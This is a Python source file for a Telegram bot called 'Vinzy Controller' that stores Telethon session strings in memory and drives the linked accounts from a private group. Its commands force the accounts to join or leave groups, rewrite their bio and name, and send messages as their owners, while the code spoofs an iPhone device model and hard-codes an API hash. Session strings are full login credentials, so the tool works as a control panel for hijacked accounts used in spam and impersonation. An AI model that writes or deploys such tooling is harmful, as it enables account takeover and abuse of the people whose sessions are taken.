import os
import asyncio
import telebot
from telethon import TelegramClient, functions, types, errors
from telethon.sessions import StringSession
from threading import Thread

# --- CONFIGURATION ---
# These are pulled from your Koyeb Environment Variables
API_ID = int(os.environ.get("API_ID", 36003995))
API_HASH = os.environ.get("API_HASH", "41a2b48afe9cfbd1fbf59c5e75b00afa")
BOT_TOKEN = os.environ.get("BOT_TOKEN")

# Standardize GROUP_ID to handle the -100 prefix for private groups
try:
    raw_group_id = os.environ.get("GROUP_ID", "0")
    GROUP_ID = int(raw_group_id)
except ValueError:
    GROUP_ID = 0

# Initialize the Bot (Telebot for the Command UI)
bot = telebot.TeleBot(BOT_TOKEN)

# In-memory database (Note: Data clears on Koyeb restart/redeploy)
# Format: { "phone_number": "session_string" }
db_sessions = {}

# --- CORE UTILITY: TELETHON EXECUTION ---

async def run_telethon_task(session_str, task_func, *args):
    """
    Connects to a session string, executes a specific task, 
    and then safely disconnects to avoid IP bans.
    """
    client = TelegramClient(StringSession(session_str), API_ID, API_HASH, device_model="iPhone 15 Pro Max")
    try:
        await client.connect()
        if not await client.is_user_authorized():
            return "❌ Error: This session string has expired or was revoked by the user."
        
        # Execute the passed function
        result = await task_func(client, *args)
        return result
    except errors.FloodWaitError as e:
        return f"⚠️ Telegram FloodWait: Please wait {e.seconds} seconds."
    except Exception as e:
        return f"⚠️ Technical Error: {str(e)}"
    finally:
        await client.disconnect()

# --- BOT COMMAND HANDLERS ---

@bot.message_handler(commands=['start', 'help'])
def send_welcome(m):
    if m.chat.id != GROUP_ID: return
    help_menu = (
        "👑 <b>Vinzy Controller v1.0</b>\n"
        "<i>Professional Session Management</i>\n"
        "━━━━━━━━━━━━━━━\n"
        "🔌 <b>Step 1: Authorization</b>\n"
        "• <code>.auth [string]</code> - Add a new session to DB\n"
        "• <code>.list</code> - View all manageable phones\n\n"
        "🎮 <b>Step 2: Account Control</b>\n"
        "• <code>.join [phone] [username]</code> - Force join group\n"
        "• <code>.leave [phone] [username]</code> - Leave a group\n"
        "• <code>.bio [phone] [text]</code> - Update account bio\n"
        "• <code>.name [phone] [first] [last]</code> - Change name\n"
        "• <code>.msg [phone] [target] [text]</code> - Send message\n"
        "━━━━━━━━━━━━━━━\n"
        "<i>Use the phone number exactly as shown in .list</i>"
    )
    bot.send_message(m.chat.id, help_menu, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text.startswith('.auth'))
def handle_auth(m):
    if m.chat.id != GROUP_ID: return
    parts = m.text.split(" ", 1)
    if len(parts) < 2:
        return bot.reply_to(m, "❌ <b>Usage:</b> <code>.auth [session_string]</code>")
    
    session_str = parts[1].strip()
    bot.send_message(m.chat.id, "⏳ <i>Verifying session...</i>", parse_mode="HTML")

    async def verify_logic(client):
        me = await client.get_me()
        db_sessions[me.phone] = session_str
        return f"✅ <b>Authorized Successfully!</b>\n👤 Name: {me.first_name}\n📱 Phone: <code>{me.phone}</code>\n🆔 ID: <code>{me.id}</code>"

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    response = loop.run_until_complete(run_telethon_task(session_str, verify_logic))
    bot.send_message(m.chat.id, response, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text == '.list')
def handle_list(m):
    if m.chat.id != GROUP_ID: return
    if not db_sessions:
        return bot.send_message(m.chat.id, "📭 <b>Database is currently empty.</b>", parse_mode="HTML")
    
    output = "📋 <b>Active Controlled Accounts:</b>\n"
    for phone in db_sessions:
        output += f"• <code>{phone}</code>\n"
    bot.send_message(m.chat.id, output, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text.startswith('.join'))
def handle_join(m):
    if m.chat.id != GROUP_ID: return
    parts = m.text.split(" ")
    if len(parts) < 3:
        return bot.reply_to(m, "❌ <b>Usage:</b> <code>.join [phone] [group_username]</code>")
    
    phone, target = parts[1], parts[2]
    if phone not in db_sessions:
        return bot.reply_to(m, "❌ Phone number not found in local DB.")

    async def join_logic(client, group):
        await client(functions.channels.JoinChannelRequest(channel=group))
        return f"✅ <code>{phone}</code> has successfully joined <b>{group}</b>"

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    response = loop.run_until_complete(run_telethon_task(db_sessions[phone], join_logic, target))
    bot.send_message(m.chat.id, response, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text.startswith('.bio'))
def handle_bio(m):
    if m.chat.id != GROUP_ID: return
    parts = m.text.split(" ", 2)
    if len(parts) < 3:
        return bot.reply_to(m, "❌ <b>Usage:</b> <code>.bio [phone] [new_bio_text]</code>")
    
    phone, new_bio = parts[1], parts[2]
    if phone not in db_sessions: return bot.reply_to(m, "❌ Phone not found.")

    async def bio_logic(client, text):
        await client(functions.account.UpdateProfileRequest(about=text))
        return f"✅ Bio updated for <code>{phone}</code>"

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    response = loop.run_until_complete(run_telethon_task(db_sessions[phone], bio_logic, new_bio))
    bot.send_message(m.chat.id, response, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text.startswith('.msg'))
def handle_msg(m):
    if m.chat.id != GROUP_ID: return
    parts = m.text.split(" ", 3)
    if len(parts) < 4:
        return bot.reply_to(m, "❌ <b>Usage:</b> <code>.msg [phone] [target_user] [message]</code>")
    
    phone, target, text = parts[1], parts[2], parts[3]
    if phone not in db_sessions: return bot.reply_to(m, "❌ Phone not found.")

    async def msg_logic(client, t, txt):
        await client.send_message(t, txt)
        return f"✅ Message sent from <code>{phone}</code> to <b>{t}</b>"

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    response = loop.run_until_complete(run_telethon_task(db_sessions[phone], msg_logic, target, text))
    bot.send_message(m.chat.id, response, parse_mode="HTML")

# --- RUNNER ---

if __name__ == "__main__":
    print("--- Vinzy Controller Online ---")
    print(f"Targeting Group ID: {GROUP_ID}")
    bot.infinity_polling()
